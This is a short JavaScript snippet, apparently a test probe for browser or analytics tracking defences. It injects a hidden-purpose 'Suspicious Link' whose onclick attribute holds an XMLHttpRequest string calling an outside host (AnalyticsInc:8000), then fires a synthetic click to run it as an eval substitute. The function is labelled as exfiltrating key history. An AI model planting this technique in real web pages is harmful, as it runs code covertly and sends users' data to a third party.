function exfiltrate_key_history() {

    // Dispatch Event 2 - Hyperlink - Eval Alternative 
    // Exfiltrate data using XMLHTTP request
    var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=link2", true);xmlhttp.send(null);';
	var link = document.createElement("a");
	link.href = '#';
	link.innerHTML = 'Suspicious Link';
    link.id = 'mylink';
    link.setAttribute("onclick",exp);
	document.getElementsByTagName('body')[0].appendChild(link);
    var linkref = document.getElementById('mylink');
	var event = new Event('click');
	linkref.dispatchEvent(event);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
